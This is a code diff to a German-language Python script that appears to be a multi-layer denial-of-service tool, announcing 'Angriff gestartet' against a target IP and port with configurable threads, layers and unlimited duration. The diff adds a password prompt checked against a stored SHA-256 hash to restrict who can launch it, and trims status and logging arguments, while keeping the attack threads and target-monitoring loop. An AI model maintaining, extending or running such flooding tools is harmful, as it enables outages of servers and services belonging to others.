@@ -1,4 +1,6 @@
 import argparse
+import getpass
+import hashlib
 import random
 import socket
 import ssl
@@ -73,8 +75,7 @@ def run_attack(layers, target_ip, target_port, progress, start_time, duration):
             attack_layer7_http(target_ip, progress)
 
 
-def display_status(progress, start_time, duration, monitor_layer7, target_ip):
-    prev_layer7 = -1
+def display_status(progress, start_time, duration):
     while True:
         elapsed = int(time.time() - start_time)
         if duration and elapsed >= duration:
@@ -103,7 +104,7 @@ def display_status(progress, start_time, duration, monitor_layer7, target_ip):
         time.sleep(1)
 
 
-def print_log(progress, start_time, duration):
+def print_log(progress, start_time):
     global server_status_global
     elapsed = int(time.time() - start_time)
     hours, remainder = divmod(elapsed, 3600)
@@ -145,6 +146,9 @@ def check_server_status_periodically(target_ip, stop_event, start_time):
 
         time.sleep(1)
 
+def hash_password(password):
+    return hashlib.sha256(password.encode()).hexdigest()
+
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(
@@ -157,6 +161,14 @@ if __name__ == "__main__":
     args = parser.parse_args()
 
     layers = args.layer.split(",") if args.layer != "all" else ["3", "4", "6", "7"]
+
+    STORED_PASSWORD_HASH = "4abf5fcdc342a219232f1b40c24aadbe59457011573e1b15a1c30a65d9fe3356"
+    while True:
+        user_input = getpass.getpass("Bitte Script-Passwort eingeben: ")
+        if hash_password(user_input) == STORED_PASSWORD_HASH:
+            break
+        else:
+            print("Falsches Passwort! Versuche es erneut...")
 
     print(
         f"\n[!] Angriff gestartet auf {args.target}:{args.port} | Layer: {','.join(layers)} | Threads: {args.threads} | Dauer: {args.duration if args.duration else 'unendlich'} Sekunden\n"
@@ -180,7 +192,7 @@ if __name__ == "__main__":
             t.start()
 
         display = threading.Thread(target=display_status,
-                                   args=(progress, start_time, args.duration, "7" in layers, args.target))
+                                   args=(progress, start_time, args.duration))
         stop_event = threading.Event()
         server_monitor = threading.Thread(target=check_server_status_periodically,
                                           args=(args.target, stop_event, start_time))
@@ -190,11 +202,11 @@ if __name__ == "__main__":
         display.join()
 
         print("\n[!] Angriff beendet.")
-        print_log(progress, start_time, args.duration)
+        print_log(progress, start_time)
 
     except KeyboardInterrupt:
         print("\n[!] KeyboardInterrupt: Angriff abgebrochen durch Benutzer.")
-        print_log(progress, start_time, args.duration)
+        print_log(progress, start_time)
         print("\n[!] Angriff beendet.")
         stop_event.set()
         server_monitor.join()
